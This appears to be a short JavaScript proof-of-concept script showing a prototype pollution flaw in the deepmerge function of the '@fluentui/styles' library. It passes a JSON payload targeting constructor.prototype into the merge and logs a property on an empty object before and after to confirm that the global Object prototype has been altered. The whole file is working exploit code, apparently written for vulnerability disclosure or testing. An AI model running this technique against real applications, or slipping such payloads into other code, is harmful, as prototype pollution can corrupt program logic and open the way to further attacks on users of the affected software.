var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const styles = require('@fluentui/styles');
const malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
const source2 = { k3: {} };
console.log({}.polluted);
let x = styles.deepmerge(source2, JSON.parse(malicious_payload));
console.log({}.polluted);